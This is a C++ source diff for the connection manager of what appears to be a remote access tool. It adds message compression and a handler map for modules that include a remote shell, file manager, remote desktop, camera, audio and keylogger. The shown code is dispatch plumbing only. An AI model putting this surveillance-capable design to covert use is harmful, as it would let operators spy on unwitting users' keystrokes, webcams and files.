@@ -2,9 +2,8 @@
 #include "Manager.h"
 #include"IOCPServer.h"
 #include "Packet.h"
-#include "EventHandler.h"
+#include "MsgHandler.h"
 #include "ClientContext.h"
-
 #include "KernelSrv.h"
 #include "MiniFileTransSrv.h"
 #include "MiniDownloadSrv.h"
@@ -17,142 +16,254 @@
 #include "AudioSrv.h"
 #include "MainFrm.h"
 #include "KeybdLogSrv.h"
+#include "zlib\zlib.h"
+#include "InvalidHandler.h"
+
+
+#define ENABLE_COMPRESS 1
+
+#define MSG_COMPRESS	0x80000000
+
+#ifdef DEBUG
+#pragma comment(lib,"zlibd.lib")
+#else
+#pragma comment(lib,"zlib.lib")
+#endif
 
 CManager::CManager(CIOCPServer*pServer)
 {
 	m_pServer = pServer;
+	InitializeCriticalSectionAndSpinCount(&m_cs, 4000);
 }
 
 CManager::~CManager()
 {
+	DeleteCriticalSection(&m_cs);
+}
+
+void CManager::add(CClientContext * pCtx, CMsgHandler*pHandler){
+	lock();
+	m_Ctx2Handler.insert(std::pair<void*, void*>(pCtx, pHandler));
+	m_Handler2Ctx.insert(std::pair<void*, void*>(pHandler, pCtx));
+	unlock();
+}
+void CManager::remove(CClientContext * pCtx, CMsgHandler*pHandler){
+	lock();
+
+	auto it = m_Ctx2Handler.find(pCtx);
+	ASSERT(it != m_Ctx2Handler.end());
+	m_Ctx2Handler.erase(it);
+
+	it = m_Handler2Ctx.find(pHandler);
+	ASSERT(it != m_Handler2Ctx.end());
+	m_Handler2Ctx.erase(it);
+	
+	unlock();
+}
+CClientContext * CManager::handler2ctx(CMsgHandler*pHandler){
+	CClientContext * pCtx = nullptr;
+	lock();
+
+	auto it = m_Handler2Ctx.find(pHandler);
+	ASSERT(it != m_Handler2Ctx.end());
+	pCtx = (CClientContext*)it->second;
+
+	unlock();
+	return pCtx;
+}
+CMsgHandler	   * CManager::ctx2handler(CClientContext*pCtx){
+	CMsgHandler * pMsgHandler = nullptr;
+	lock();
+
+	auto it = m_Ctx2Handler.find(pCtx);
+	ASSERT(it != m_Ctx2Handler.end());
+	pMsgHandler =(CMsgHandler*)it->second;
+
+	unlock();
+	return pMsgHandler;
+}
+
+const pair<string, unsigned short> CManager::GetPeerName(CMsgHandler * pMsgHandler){
+	SOCKADDR_IN  addr = { 0 };
+	CClientContext * pCtx = handler2ctx(pMsgHandler);
+	int namelen = sizeof(addr);
+	getpeername(pCtx->m_ClientSocket, (sockaddr*)&addr, &namelen);
+	return pair<string, unsigned short>(inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));
+}
+
+const pair<string, unsigned short> CManager::GetSockName(CMsgHandler * pMsgHandler){
+	SOCKADDR_IN  addr = { 0 };
+	CClientContext * pCtx = handler2ctx(pMsgHandler);
+	int namelen = sizeof(addr);
+	getsockname(pCtx->m_ClientSocket, (sockaddr*)&addr, &namelen);
+	return pair<string, unsigned short>(inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));
 }
 
 //HandlerInit And HandlerTerm will be called in UI Thread.
-BOOL CManager::HandlerInit(CClientContext*pClientContext, DWORD Identity)
+BOOL CManager::handler_init(CClientContext*pClientContext, DWORD Identity)
 {
 	if (!pClientContext)
 		return FALSE;
-	CEventHandler*pHandler = NULL;
-	CMainFrame*pMainFrame = NULL;
+
+	CMsgHandler*pHandler = NULL;
 	/**************************Create Handler*********************************/
 	switch (Identity)
 	{
 	case KNEL:
-		pMainFrame = (CMainFrame*)AfxGetApp()->m_pMainWnd;
-		pHandler = new CKernelSrv(pMainFrame->m_ClientList.GetSafeHwnd(), Identity);
+		pHandler = new CKernelSrv(((CMainFrame*)AfxGetApp()->m_pMainWnd)->
+			m_ClientList.GetSafeHwnd(),this);
 		break;
 	case MINIFILETRANS:
-		pHandler = new CMiniFileTransSrv(Identity);
+		pHandler = new CMiniFileTransSrv(this);
 		break;
 	case MINIDOWNLOAD:
-		pHandler = new CMiniDownloadSrv(Identity);
+		pHandler = new CMiniDownloadSrv(this);
 		break;
 	case CMD:
-		pHandler = new CCmdSrv(Identity);
+		pHandler = new CCmdSrv(this);
 		break;
 	case CHAT:
-		pHandler = new CChatSrv(Identity);
+		pHandler = new CChatSrv(this);
 		break;
 	case FILE_MANAGER:
-		pHandler = new CFileManagerSrv(Identity);
+		pHandler = new CFileManagerSrv(this);
 		break;
 	case FILEMGR_SEARCH:
-		pHandler = new CFileMgrSearchSrv(Identity);
+		pHandler = new CFileMgrSearchSrv(this);
 		break;
 	case REMOTEDESKTOP:
-		pHandler = new CRemoteDesktopSrv(Identity);
+		pHandler = new CRemoteDesktopSrv(this);
 		break;
 	case CAMERA:
-		pHandler = new CCameraSrv(Identity);
+		pHandler = new CCameraSrv(this);
 		break;
 	case AUDIO:
-		pHandler = new CAudioSrv(Identity);
+		pHandler = new CAudioSrv(this);
 		break;
 	case KBLG:
-		pHandler = new CKeybdLogSrv(Identity);
+		pHandler = new CKeybdLogSrv(this);
+		break;
+	default:
+		pHandler = new CInvalidHandler(this);
 		break;
 	}
-	/**************************************************************************/
-	if (!pHandler)
-		return FALSE;
-	pClientContext->BindHandler(pHandler);
-	pHandler->OnConnect();
+	ASSERT(pHandler);	
+	add(pClientContext, pHandler);
+	//
+	pHandler->OnOpen();
 	return TRUE;
 }
-BOOL CManager::HandlerTerm(CClientContext*pClientContext, DWORD Identity)
-{
+
+BOOL CManager::handler_term(CClientContext*pClientContext, DWORD Identity){
 	if (!pClientContext)
 		return FALSE;
-	if (!pClientContext->m_pHandler)
-		return FALSE;
 
-	CEventHandler*pHandler = pClientContext->m_pHandler;
-
+	CMsgHandler * pHandler = ctx2handler(pClientContext);
 	pHandler->OnClose();
 
-	pClientContext->UnbindHandler();
+	//remove.
+	remove(pClientContext, pHandler);
 	delete pHandler;
 	return TRUE;
 }
 
-void CManager::ProcessCompletedPacket(int type, CClientContext*pContext, CPacket*pPacket)
-{
-	WORD Event = 0;
+void CManager::Close(CMsgHandler*pHandler){
+	CClientContext *pCtx = handler2ctx(pHandler) ;// (CClientContext*)it->second;
+	pCtx->Disconnect();
+}
+
+BOOL CManager::SendMsg(CMsgHandler*pHandler, WORD Msg, char*data, size_t len){
+	CClientContext *pCtx = handler2ctx(pHandler);
+
+	Byte * source = (Byte*)data;
+	uLong source_len = len;
+	DWORD dwFlag = 0;
+
+	if (ENABLE_COMPRESS){
+		uLong bufferSize = compressBound(source_len);
+		Byte * compreeBuffer = new Byte[bufferSize];
+
+		int err = compress(compreeBuffer, &bufferSize, source, source_len);
+		if (err == S_OK){
+			dwFlag = source_len;			//保存原始长度
+			dwFlag |= MSG_COMPRESS;
+
+			source = compreeBuffer;
+			source_len = bufferSize;
+		}
+		else{
+			//失败的话就不压缩....
+			delete[] compreeBuffer;
+		}
+
+	}
+	pCtx->SendPacket(Msg, (const char*)source, source_len, dwFlag);
+	if (dwFlag & MSG_COMPRESS){
+		delete[] source;
+	}	return TRUE;
+}
+
+void CManager::DispatchMsg(CClientContext*pContext,CPacket*pPkt){
+	CMsgHandler * pHandler = ctx2handler(pContext);
+
+	WORD Msg			= pPkt->GetCommand();
+	Byte * source		= (Byte*)pPkt->GetBody();
+	uLong source_len	= pPkt->GetBodyLen();
+	DWORD dwFlag		= pPkt->GetFlag();
+
+	if (dwFlag & MSG_COMPRESS){
+		uLong bufferSize = dwFlag & (~MSG_COMPRESS);
+		Byte * uncompressBuffer = new Byte[bufferSize];
+		int err = Z_OK;
+
+		err = uncompress(uncompressBuffer, &bufferSize, source, source_len);
+		if (err == Z_OK){
+			source = uncompressBuffer;
+			source_len = bufferSize;
+		}
+		else{
+			delete[] uncompressBuffer;
+			return;
+		}
+	}
+	pHandler->OnReadMsg(Msg, source_len, (char*)source);
+	if (dwFlag  &MSG_COMPRESS){
+		delete[] source;
+	}
+}
+
+void CManager::ProcessCompletedPacket(int type, CClientContext*pCtx, CPacket*pPacket){
+
+	WORD Msg = 0;
 	DWORD dwTotal = 0;
 	DWORD dwRead = 0;
 	DWORD dwWrite = 0;
 	HRESULT hResult = 0;
-	switch (type)
-	{
-	case PACKET_ACCEPT_ABORT:
-		break;
-		
-		//OnConnect and OnClose will be called in main thread.!
-	case PACKET_CLIENT_CONNECT:
-		if (!SendMessage(m_pServer->m_hNotifyWnd, WM_SOCKET_CONNECT, (WPARAM)pContext, pContext->m_Identity))
-			pContext->Disconnect();
-		break;
 
-	case PACKET_CLIENT_DISCONNECT:
-		SendMessage(m_pServer->m_hNotifyWnd, WM_SOCKET_CLOSE, (WPARAM)pContext, pContext->m_Identity);
-		break;
-		//
-	case PACKET_READ_COMPLETED:
-		if (pPacket->GetCommand() != HEART_BEAT){
-			Event = GetCommandEvent(pPacket->GetCommand());
-			dwTotal = pPacket->GetBodyLen();
-			dwRead = pContext->m_dwRead - PACKET_HEADER_LEN;
-			pContext->m_pHandler->OnReadComplete(Event, dwTotal, dwRead,pPacket->GetBody());
-		}
-		else{
-			pContext->SendPacket(HEART_BEAT, 0, 0);			//reply heart beat.
-		}
-		break;
-	case PACKET_READ_PARTIAL:
-		if (pPacket->GetCommand() != HEART_BEAT){
-			Event = GetCommandEvent(pPacket->GetCommand());
-			dwTotal = pPacket->GetBodyLen();
-			dwRead = pContext->m_dwRead - PACKET_HEADER_LEN;
-			pContext->m_pHandler->OnReadPartial(Event, dwTotal, dwRead, pPacket->GetBody());
-		}
-		break;
+	if (PACKET_ACCEPT_ABORT == type){
+		///emmmmm...
+	}
 
-	case PACKET_WRITE_COMPLETED:
-		if (pPacket->GetCommand() != HEART_BEAT){
-			Event = GetCommandEvent(pPacket->GetCommand());
-			dwTotal = pPacket->GetBodyLen();
-			dwWrite = pContext->m_dwWrite - PACKET_HEADER_LEN;
-			pContext->m_pHandler->OnWriteComplete(Event, dwTotal, dwWrite, pPacket->GetBody());
-		}
-		break;
+	if (PACKET_CLIENT_CONNECT == type){
+		if (!SendMessage(m_pServer->m_hNotifyWnd, 
+			WM_SOCKET_CONNECT, (WPARAM)pCtx, pCtx->m_Identity))
+			pCtx->Disconnect();
+		return;
+	}
 
-	case PACKET_WRITE_PARTIAL:
-		if (pPacket->GetCommand() != HEART_BEAT){
-			Event = GetCommandEvent(pPacket->GetCommand());
-			dwTotal = pPacket->GetBodyLen();
-			dwWrite = pContext->m_dwWrite - PACKET_HEADER_LEN;
-			pContext->m_pHandler->OnWritePartial(Event, dwTotal, dwWrite, pPacket->GetBody());
+	if (PACKET_CLIENT_DISCONNECT == type){
+		SendMessage(m_pServer->m_hNotifyWnd, WM_SOCKET_CLOSE, 
+			(WPARAM)pCtx, pCtx->m_Identity);
+		return;
+	}
+
+	if (PACKET_READ_COMPLETED == type){
+		if (pPacket->GetCommand() == HEART_BEAT){
+			//心跳包回复....
+			pCtx->SendPacket(HEART_BEAT, 0, 0, 0);
+			return;
 		}
-		break;
+		DispatchMsg(pCtx, pPacket);
+		return;
 	}
 }
